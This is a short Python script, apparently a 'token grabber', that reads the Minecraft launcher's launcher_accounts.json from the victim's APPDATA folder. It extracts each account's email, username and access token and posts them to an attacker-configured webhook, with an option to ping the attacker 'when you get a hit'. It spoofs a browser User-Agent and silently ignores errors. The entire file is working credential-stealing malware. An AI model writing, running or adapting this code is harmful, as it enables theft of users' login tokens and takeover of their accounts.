import json
import os
from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = "WEBHOOK URL HERE"

# mentions you when you get a hit
PING_ME = True


def main():

    embeds = []

    auth_db = json.loads(open(os.getenv(
        "APPDATA") + "\\.minecraft\\launcher_accounts.json").read())["accounts"]

    for x in auth_db:
        try:
            email = auth_db[x].get("username")
            username = auth_db[x]["minecraftProfile"]["name"]

            embed = {
                "fields": [
                    {"name": "Email", "value": email if email and "@" in email else "N/A"},
                    {"name": "Username", "value": username},
                    {"name": "Token", "value": auth_db[x]["accessToken"]},
                ]
            }
            embeds.append(embed)
        except:
            pass

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }

    payload = json.dumps(
        {"embeds": embeds, "content": "@everyone" if PING_ME else ""})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    main()
